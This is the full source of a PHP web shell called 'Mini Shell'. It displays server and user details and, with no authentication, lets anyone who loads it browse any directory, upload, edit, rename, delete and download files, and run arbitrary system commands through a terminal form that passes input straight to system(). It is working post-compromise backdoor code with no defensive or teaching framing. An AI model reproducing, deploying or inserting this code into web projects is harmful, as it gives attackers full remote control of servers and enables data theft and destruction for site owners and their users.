<?php
session_start();
ob_start();

$path = $_GET['path'] ?? getcwd();
$files = scandir($path);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$server = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$user = get_current_user();
$os = php_uname();
$writable = is_writable($path);
$pathColor = $writable ? "green" : "red";

// Delete
if (isset($_GET['delete'])) {
  $target = realpath($path . "/" . basename($_GET['delete']));
  if (is_dir($target)) rmdir($target);
  elseif (is_file($target)) unlink($target);
  header("Location: ?path=" . urlencode($path));
  exit;
}

// Rename
if (isset($_POST['renamebtn'])) {
  $old = realpath($path . "/" . basename($_POST['oldname']));
  $new = $path . "/" . basename($_POST['newname']);
  rename($old, $new);
  header("Location: ?path=" . urlencode($path));
  exit;
}

// Save Edit
if (isset($_POST['saveedit'])) {
  $editPath = $path . "/" . basename($_POST['editfile']);
  file_put_contents($editPath, $_POST['newcontent']);
  echo "<div class='alert success'>✅ File updated!</div>";
}

// Download
if (isset($_GET['download'])) {
  $dlPath = $path . "/" . basename($_GET['download']);
  if (is_file($dlPath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($dlPath).'"');
    header('Content-Length: ' . filesize($dlPath));
    readfile($dlPath);
    exit;
  }
}
?>
<!DOCTYPE html><html>
<head>
  <title>Mini Shell</title>
  <style>
    body { background:#f9f9f9; color:#111; font-family:monospace; padding:20px; }
    a, button { color:#007BFF; text-decoration:none; background:none; border:none; cursor:pointer; font-family:monospace; }
    a:hover, button:hover { text-decoration:underline; }
    .navbar { background:#eaeaea; padding:10px; border-bottom:1px solid #ccc; margin-bottom:20px; }
    .navbar span { margin-right:20px; }
    table { width:100%; border-collapse:collapse; }
    th, td { border:1px solid #ccc; padding:8px; text-align:left; }
    pre, textarea { background:#fff; color:#000; padding:10px; border:1px solid #ccc; width:100%; white-space:pre-wrap; }
    button.nav { margin:3px; padding:5px 10px; border:1px solid #ccc; background:#fff; color:#000; }
    .alert.success { background:#d4edda; border:1px solid #c3e6cb; color:#155724; padding:10px; margin:10px 0; }
    .alert.error { background:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; margin:10px 0; }
    .terminal-output { background:#fff; color:#000; border:1px solid #ccc; padding:10px; margin-top:10px; font-size:14px; white-space:pre-wrap; }
    .box { background:#f2f2f2; padding:15px; border:1px solid #ccc; margin-top:10px; }
  </style>
</head>
<body>

<div class="navbar">
  <span><b>🧩 Mini Shell</b></span>
  <span>🌐 IP: <?= $ip ?></span>
  <span>🛠 Server: <?= $server ?></span>
  <span>👤 User: <?= $user ?></span>
</div>

<p><b>📂 Current Path:</b> <span style="color:<?= $pathColor ?>">
<?php
$parts = explode("/", $path);
$breadcrumbs = '';
foreach ($parts as $i => $part) {
  if ($part === '') continue;
  $breadcrumbs .= "/$part";
  echo "/<a href='?path=" . urlencode($breadcrumbs) . "'>$part</a>";
}
?>
</span></p>

<form method="get">
  <input type="hidden" name="path" value="<?= dirname($path) ?>">
  <button class="nav">⬅️ Up</button>
</form>

<form method="post" enctype="multipart/form-data">
  <input type="file" name="upload">
  <input type="submit" value="Upload">
</form>

<?php
// Upload
if ($_FILES) {
  $target = $path . "/" . basename($_FILES["upload"]["name"]);
  if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target)) {
    echo "<div class='alert success'>✅ Uploaded: " . htmlspecialchars($_FILES["upload"]["name"]) . "</div>";
  } else {
    echo "<div class='alert error'>❌ Upload failed</div>";
  }
}
?>

<br><hr><h3>📁 File & Directory</h3>
<?php
$folders = [];
$filesList = [];
foreach ($files as $file) {
  if ($file === "." || $file === "..") continue;
  if (is_dir($path . "/" . $file)) $folders[] = $file;
  else $filesList[] = $file;
}

function print_row($file, $path) {
  $fullpath = $path . "/" . $file;
  $encodedPath = urlencode($path);
  $encodedFile = urlencode($file);
  $type = is_dir($fullpath) ? "Folder" : "File";
  $size = is_file($fullpath) ? filesize($fullpath) . " B" : "-";
  $mod = date("Y-m-d H:i:s", filemtime($fullpath));
  echo "<tr>";
  if (is_dir($fullpath)) {
    echo "<td><form method='get' style='display:inline'><input type='hidden' name='path' value='" . htmlspecialchars($fullpath) . "'><button class='nav'>📁 $file</button></form></td>";
  } else {
    echo "<td>$file</td>";
  }
  echo "<td>$type</td><td>$size</td><td>$mod</td>";
  echo "<td><a href='?path=$encodedPath&delete=$encodedFile' onclick='return confirm(\"Delete?\")'>❌ Delete</a> |
  <a href='?path=$encodedPath&rename=$encodedFile'>✏️ Rename</a>";
  if (is_file($fullpath)) {
    echo " | <a href='?path=$encodedPath&view=$encodedFile'>👁️ View</a>
    | <a href='?path=$encodedPath&edit=$encodedFile'>📝 Edit</a>
    | <a href='?path=$encodedPath&download=$encodedFile'>📥 Download</a>";
  }
  echo "</td></tr>";
}

echo "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Action</th></tr>";
foreach ($folders as $f) print_row($f, $path);
foreach ($filesList as $f) print_row($f, $path);
echo "</table>";
?>

<hr><h3>💻 Terminal Shell</h3>
<form method="post">
  <label><b>$</b></label>
  <input type="text" name="cmd" autofocus style="width:80%;background:#fff;color:#000;border:1px solid #ccc;">
  <input type="submit" value="Run" style="background:#eee;color:#000;border:1px solid #ccc;">
</form>

<?php
if (isset($_POST['cmd'])) {
  echo "<div class='terminal-output'>";
  $cmd = $_POST['cmd'];
  echo "<b style='color:#007BFF;'>$ $cmd</b>\n";
  system($cmd);
  echo "</div>";
}
?>

<?php
// Semua Form di bawah terminal
if (isset($_GET['edit'])) {
  $filepath = $path . "/" . basename($_GET['edit']);
  if (is_file($filepath)) {
    $content = htmlspecialchars(file_get_contents($filepath));
    echo "<div class='box'><h3>📝 Edit: " . htmlspecialchars($_GET['edit']) . "</h3>";
    echo "<form method='post'>";
    echo "<input type='hidden' name='editfile' value='" . htmlspecialchars($_GET['edit']) . "'>";
    echo "<textarea name='newcontent' rows='20'>$content</textarea><br>";
    echo "<button type='submit' name='saveedit'>💾 Save</button>";
    echo "</form></div>";
  }
}

if (isset($_GET['rename'])) {
  echo "<div class='box'><h3>✏️ Rename: " . htmlspecialchars($_GET['rename']) . "</h3>";
  echo "<form method='post'>";
  echo "<input type='hidden' name='oldname' value='" . htmlspecialchars($_GET['rename']) . "'>";
  echo "New Name: <input type='text' name='newname' value='" . htmlspecialchars($_GET['rename']) . "' required>";
  echo "<button type='submit' name='renamebtn'>🔁 Rename</button>";
  echo "</form></div>";
}

if (isset($_GET['view'])) {
  $filepath = $path . "/" . basename($_GET['view']);
  if (is_file($filepath)) {
    echo "<div class='box'><h3>👁️ View: " . htmlspecialchars($_GET['view']) . "</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($filepath)) . "</pre></div>";
  }
}
?>
</body>
</html>